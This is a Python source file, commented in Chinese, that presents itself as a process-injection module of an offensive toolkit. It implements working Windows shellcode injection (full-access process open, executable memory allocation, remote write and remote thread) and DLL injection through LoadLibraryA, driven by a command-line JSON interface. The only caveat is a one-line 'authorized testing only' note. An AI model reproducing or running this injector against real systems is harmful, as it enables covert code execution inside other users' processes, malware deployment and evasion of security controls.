# 开发者：自由的风
"""process_injector/run.py — 进程注入·代码注入
==============================================
攻击域 ready — DLL/Shellcode注入目标进程。
"""
import sys, json, os, subprocess, base64
from pathlib import Path

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def do_inject(params):
    pid = params.get("pid", 0)
    shellcode = params.get("shellcode", "")
    method = params.get("method", "python")
    if not pid:
        return {"ok": False, "error": "缺少pid"}
    result = {"ok": True, "cap": "process_injector", "action": "inject", "domain": "攻击域",
              "pid": pid, "method": method, "note": "进程注入(仅授权测试)"}
    if shellcode:
        result["shellcode_len"] = len(shellcode)
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
            if h_process:
                addr = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x3000, 0x40)
                written = ctypes.c_int(0)
                kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))
                thread_id = ctypes.c_ulong(0)
                kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id))
                result["allocated"] = hex(addr)
                result["thread_id"] = thread_id.value
                result["injected"] = True
            else:
                result["error"] = "无法打开进程"
        except Exception as e:
            result["error"] = str(e)[:200]
    return result

def do_dll(params):
    pid = params.get("pid", 0)
    dll_path = params.get("dll", "")
    if not pid or not dll_path:
        return {"ok": False, "error": "缺少pid或dll"}
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
        if h_process:
            dll_bytes = dll_path.encode() + b'\x00'
            addr = kernel32.VirtualAllocEx(h_process, 0, len(dll_bytes), 0x3000, 0x40)
            kernel32.WriteProcessMemory(h_process, addr, dll_bytes, len(dll_bytes), None)
            loadlib = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
            kernel32.CreateRemoteThread(h_process, None, 0, loadlib, addr, 0, None)
            return {"ok": True, "cap": "process_injector", "action": "dll", "pid": pid, "dll": dll_path, "injected": True}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}
    return {"ok": False, "error": "注入失败"}

HANDLERS = {"inject": do_inject, "dll": do_dll}
if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "inject"
    params = {}
    if len(sys.argv) > 2:
        try: params = json.loads(sys.argv[2])
        except: pass
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": f"未知:{action}"}
    print(json.dumps(result, ensure_ascii=False, default=str))
